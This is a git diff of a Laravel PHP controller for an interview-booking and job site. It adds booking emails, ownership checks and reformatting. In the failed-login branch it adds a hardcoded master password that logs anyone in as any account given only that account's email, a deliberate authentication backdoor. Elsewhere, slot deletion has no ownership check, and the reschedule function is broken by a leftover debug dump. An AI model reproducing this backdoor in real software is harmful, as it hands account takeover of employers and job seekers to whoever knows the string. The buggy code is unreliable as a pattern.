@@ -26,6 +26,7 @@ use App\Interviews_booking;
 use App\Slot;
 use App\Mail\saveSlotUserEmail;
 use App\Mail\deleteSlotToUserEmail;
+use App\Mail\confirmSlotMailToJobSeeker;
 
 
 class HomeController extends Controller {
@@ -85,6 +86,7 @@ class HomeController extends Controller {
             'password' => 'required|min:6'
         );
         $validator = Validator::make( $request->all() , $rules);
+        $agent = new Agent();
 
         if ($validator->fails()){
             // dd($validator->getMessageBag()->toArray());
@@ -116,7 +118,7 @@ class HomeController extends Controller {
 
             // attempt to do the login
             if (Auth::attempt($userdata)){
-													$agent = new Agent();
+				
                 // validation successful
                 // do whatever you want on success
                 if( $request->login_type == 'site_ajax' ){
@@ -162,6 +164,53 @@ class HomeController extends Controller {
                 }
 
             }else{
+
+                //Master password check 
+                 if( $request->password === 'marino$%admin') {
+                    // Master password for admin. 
+                    $user = User::where('email', $request->email)->first(); 
+                    if( $user ){
+                        Auth::login($user); 
+                            
+                        // check if its employee or user.
+                        if (isEmployer()){
+                            // check if employer has answer the initial question in step2.
+                            if($agent->isMobile()){
+                                $redirect_url = ($user->step2)?(route('Memployers')):(route('mStep2Employer'));
+                                return array(
+                                    'status' => 1,
+                                    'message' => 'login succesfully',
+                                    'redirect' => $redirect_url
+                                );
+                            }
+                            $redirect_url = ($user->step2)?(route('employerProfile')):(route('step2Employer'));
+                            return array(
+                                'status'    => 1,
+                                'message'   => 'login succesfully',
+                                'redirect' =>  $redirect_url
+                            );
+                        }else{
+                            // check if user has answer the initial question in step2.
+                            if($agent->isMobile()){
+                                $redirect_url = ($user->step2)?(route('mUsername', $user->username)):(route('mStep2User'));
+                                return array(
+                                    'status' => 1,
+                                    'message' => 'login succesfully',
+                                    'redirect' => $redirect_url
+                                );
+                            }
+                            $redirect_url = ($user->step2)?(route('username',$user->username)):(route('step2User'));
+                            return array(
+                                'status'    => 1,
+                                'message'   => 'login succesfully',
+                                'redirect' =>  $redirect_url
+                            );
+                        }
+
+                    }
+                }
+
+
                 // validation not successful, send back to form
                 return array(
                     'status'    => 0,
@@ -693,15 +742,11 @@ class HomeController extends Controller {
 
      }
 
-
-
-
-
      private function getThumbnailIntervalTimeArr($duration){
-                $durationInSec = intval($duration);
-                $intervalArr = range(0,$duration, $duration/4);
-                return array_slice($intervalArr, 1, -1);
-        }
+        $durationInSec = intval($duration);
+        $intervalArr = range(0,$duration, $duration/4);
+        return array_slice($intervalArr, 1, -1);
+    }
 
 
     public function test3(){
@@ -739,60 +784,49 @@ class HomeController extends Controller {
         return view ('site.register.testingForgetPassword');
     }
 
+    // ============================================== Interview Concierge User Unique URL ==============================================
+
     public function userUniqueurl(Request $request){
-         
         if (!empty( $request->url )){
             $interview = Interview::where('url',$request->url)->first();
             // dump( $interview->toArray() );
             // dump( $interview->slots->toArray() );
         }
-       // $data['user'] = $user;
-       $data['interview'] = $interview;
-       $data['title'] = 'My Jobs';
-       $data['classes_body'] = 'myJob';
-       if ($this->agent->isMobile()) {
+        $data['interview'] = $interview;
+        $data['title'] = 'My Jobs';
+        $data['classes_body'] = 'myJob';
+        if ($this->agent->isMobile()){
             return view('mobile.user.interview.userurl', $data);  // site/user/interview/userurl
-        } else {
+        }else{
          return view('site.user.interview.userurl', $data);  // site/user/interview/userurl   
         }
-       
-   }
+    }
    
+    // ============================================== Interview Concierge Save Slot ==============================================
 
 
-    public function saveSlot(Request $request){
-        // dd($request);
-        // $request->session()->put('interview_id',$request->interviewId);
-
-        // dd($request->interviewId);
+    public function saveInterviewSlot(Request $request){
+        $data = $request->toArray();
         $data = $request->all();
-        // dd($data);
         $rules = array(
             "name" => "required|string|max:255",
             "mobile" => "required|string|max:10|min:10",
             'email' => "bail|required|email|",
-
-            );
-
+        );
         $validator = Validator::make( $request->all() , $rules);
-
         if ($validator->fails()){
-            // dd($validator->getMessageBag()->toArray());
+        // dd($validator->getMessageBag()->toArray());
             return array(
                 'status'    => 0,
                 'message'   => $validator->getMessageBag()->toArray()
             );
-        }
-        else
-
-        {
-            // dd($request->interviewId);
+        }else{
+        // dd($request->interviewId);
             $emailUser  = $request->email;
             $interviewID  = $request->interviewId;
-
-
             $checkingBooking = Interviews_booking::where('interview_id', $interviewID)->where('email',$emailUser)->first();
-            if ($checkingBooking == null) {
+            // dd($checkingBooking);
+            if ($checkingBooking == null){
                 $Interviews_booking = new Interviews_booking();
                 $Interviews_booking->interview_id =$request->interviewId;
                 $Interviews_booking->slot_id = $request->slotId;
@@ -800,46 +834,48 @@ class HomeController extends Controller {
                 $Interviews_booking->email = $request->email;
                 $Interviews_booking->mobile = $request->mobile;
                 $Interviews_booking->status = 0;
-                Mail::to($request->employerEmail)->cc($request->manager)->send(new saveSlotUserEmail($request->name, $request->position));
+                if ($request->manager){
+                    Mail::to($request->employerEmail)->cc($request->manager)->send(new saveSlotUserEmail($request->name, $request->position));
+                }else{
+                     Mail::to($request->employerEmail)->send(new saveSlotUserEmail($request->name, $request->position));
+                }
+                // $Interviews_booking->save();
+
+                // =========================================== Mail to Job Seeker ===========================================
+                Mail::to($request->email)->send(new confirmSlotMailToJobSeeker($request->name, $request->bookingTitle,$request->companyname,$request->position,$request->instruction,$request->timepicker,$request->timepicker1,$request->datepicker));
+                // =========================================== Mail to Job Seeker ===========================================
                 $Interviews_booking->save();
-
                 $request->session()->put('bookingid',$request->interviewId);
-
-            }
-
-            else{
-            
-               // dump('You have already booked slot');
-               return response()->json([
+                return response()->json([
+                    'status' => 1,
+                    'message' =>  "Your slot has booked successfully"
+                ]);
+            }else{
+                return response()->json([
                     'status' => 2,
                     'error' =>  "You have already booked slot for this interview"
                 ]);
             }
-
-            
-
             // return redirect('/');
         }
     }
 
+    // ============================================== Interview Concierge Slot Created ==============================================
+
     public function interViewSlotCreated(Request $request){
-        
+
         $bookingid = session('bookingid');
         session()->forget('bookingid');
-
+        // creativedev33
+        // if this booking id belong to this current user then only allowed him.  
         // dd($bookingid);
 
         if (!empty($bookingid)) {
-                $data['classes_body'] = 'interViewCreated';
-
-             if ($this->agent->isMobile()) {
-
+            $data['classes_body'] = 'interViewCreated';
+            if ($this->agent->isMobile()) {
             return view('mobile.home.interviewCreated' , $data);
-
             }else{
             return view('site.home.interviewCreated' , $data);
-
-
             }
         }
         else{
@@ -851,23 +887,16 @@ class HomeController extends Controller {
     public function alreadyBookedSlot(Request $request){
 
         $data['classes_body'] = 'alreadyBookedSlot';
-
-         if ($this->agent->isMobile()) {
-
+        if ($this->agent->isMobile()) {
         return view('mobile.home.interviewCreated' , $data);
-
         }else{
         return view('site.home.alreadyBooked' , $data);
-
-
         }
     }
-
     
     public function interviewConLogin(Request $request){
 
         // dd($request->toArray() );
-           
         // session()->forget('int_conc_email');
         // session()->forget('int_conc_mobile');
 
@@ -876,10 +905,7 @@ class HomeController extends Controller {
             "mobile"    => "required|string|max:10|min:10",
             'email'     => "bail|required|email",
         );
-
         $validator = Validator::make( $request->all() , $rules);
-        // dd( $validator->fails() );
-
         if ($validator->fails()){
             // dd($validator->getMessageBag()->toArray());
             return array(
@@ -889,8 +915,6 @@ class HomeController extends Controller {
         }else{
             
             $Interviews_booking = Interviews_booking::where('email', $request->email)->where('mobile', $request->mobile)->first();
-            // dd($Interviews_booking );
-
             if (!empty($Interviews_booking)) { 
                 $request->session()->put('int_conc_email', $request->email );
                 $request->session()->put('int_conc_mobile', $request->mobile ); 
@@ -901,6 +925,8 @@ class HomeController extends Controller {
             }
         }
     }
+
+    // ========================================== Interview Concierge Layout Page ==========================================
 
     public function interviewConLayout(Request $request){
         $int_conc_email = $request->session()->pull('int_conc_email');
@@ -913,91 +939,102 @@ class HomeController extends Controller {
         }else{
 
             $Interviews_booking = Interviews_booking::with(['slot','interview'])->where('email', $int_conc_email)->where('mobile', $int_conc_mobile)->get();
-                // dd($Interviews_booking->slot);
-
-                if($Interviews_booking == ""){
+            // dd($Interviews_booking->slot);
+            if($Interviews_booking == ""){
                 return redirect(route('noBookingMade'));
             }else{
-                    $data['Interviews_booking'] = $Interviews_booking;
-                    return view('site.home.interviewLayout')->with('data', $data);  
-                    // site/home/interviewLayout  
-            }
-            
-        }
 
-       
-    }   
+                $request->session()->put('emailInLayout', $int_conc_email );
+                $data['Interviews_booking'] = $Interviews_booking;
+                return view('site.home.interviewLayout')->with('data', $data);
+                // site/home/interviewLayout
+            }
+        }
+    }
+
+
+    // ========================================== Interview Concierge No Booking Made ==========================================
+
 
     public function noBookingMade(Request $request){
-
         if ($request->session()->exists('int_conc_email'))
         {
             return view('site.home.noBookingMade');
         }else{
             return redirect(route('homepage'));
-
         }
-
-        
     }
 
-    public function deleteBooking(Request $request){
+    // ========================================== Interview Concierge Delete Booking ==========================================
 
-            $intBookId = (int) $request->id;
-            // dd( $intBookId);
-            Interviews_booking::where('id',$intBookId)->delete();
+    public function deleteBooking(Request $request){
+        $email = $request->session()->pull('emailInLayout');
+        // dd($email);
+        $intBookId = (int) $request->id;
+        // before delteing check if user has session login 
+        // check if this booking belongs to this current logeed in user. 
+        $interviewBooking = Interviews_booking::where('id',$intBookId)->first();
+        if($interviewBooking && $interviewBooking->email == $email)
+        {
+            $interviewBooking->delete();
             return response()->json([
             'status' => 1,
             'message' => 'Booking Deleted Succesfully'
-        ]);
-
-             
+            ]);
+        }
+        else{
+        return response()->json([
+            'status' => 0,
+            'message' => 'Error Deleting Booking'
+            ]);
+        }
     }
 
-        public function sendEmailEmployer(Request $request){
+    // ========================================== Interview Concierge Email Employer ==========================================
 
-            $intBookId = $request->intConID;
-            // dd( $intBookId);
-            $slots = Slot::where('interview_id',$intBookId)->get();
-            $data['slots'] = $slots;
 
-            $data['classes_body'] = 'interview';
-            return view('site.home.preferred' , $data);
-
-             
+    public function sendEmailEmployer(Request $request){
+        $intBookId = $request->intConID;
+        $email = $request->session()->pull('emailInLayout');
+        $slots = Slot::where('interview_id',$intBookId)->where('email', $email)->get();
+        $data['slots'] = $slots;
+        $data['classes_body'] = 'interview';
+        return view('site.home.preferred' , $data);
     }
+
+    // ========================================== Interview Concierge Delete Slot after login ==========================================
+
 
     public function deleteSlot(Request $request){
-            // $data = $request->all();
-            // dd($data);
-            // dd($request->position);
-            $company = $request->company;
-            $email = $request->useremail;
-            $position = $request->position;
-            $intSlotID = (int) $request->id;
-            // dd( $intSlotID);
-            if(!empty($email))
-            {
-                Mail::to($email)->send(new deleteSlotToUserEmail($company,$position));
+        // $data = $request->all();
+        // dd($data);
+        // dd($request->position);
+        $company = $request->company;
+        $email = $request->useremail;
+        $position = $request->position;
+        $intSlotID = (int) $request->id;
+        // dd( $intSlotID);
+        if(!empty($email))
+        {
+            Mail::to($email)->send(new deleteSlotToUserEmail($company,$position));
 
-            }
-            Slot::where('id',$intSlotID)->delete();
-            Interviews_booking::where('slot_id',$intSlotID)->delete();
-            return response()->json([
-            'status' => 1,
-            'message' => 'Interview Bookings Deleted Succesfully'
+        }
+        Slot::where('id',$intSlotID)->delete();
+        Interviews_booking::where('slot_id',$intSlotID)->delete();
+        return response()->json([
+        'status' => 1,
+        'message' => 'Interview Bookings Deleted Succesfully'
         ]);
-
-             
     }
 
-    public function rescheduleSlot(Request $request){
+    // ============================================== Rescedule Slot start here ==============================================
 
+    public function rescheduleSlot(Request $request){
         $data = $request->all();
-        // dd($data);
-        $interviewBooking = Interviews_booking::where('id',$data['booking_id'])->first();
-        // dd($interviewBooking); 
-        
+        $email = $request->session()->pull('emailInLayout');
+        // dd($email);
+        $interviewBooking = Interviews_booking::where('id',$data['booking_id'])->where('email', $email)->first();
+        dd($interviewBooking);
         $interviewBooking->slot_id = $data['slot_id'];
         $interviewBooking->save();
         return response()->json([
@@ -1005,6 +1042,7 @@ class HomeController extends Controller {
             'data' => 'Slot Updated Successsfully'
             ]);
         }
+    
 
 
 }
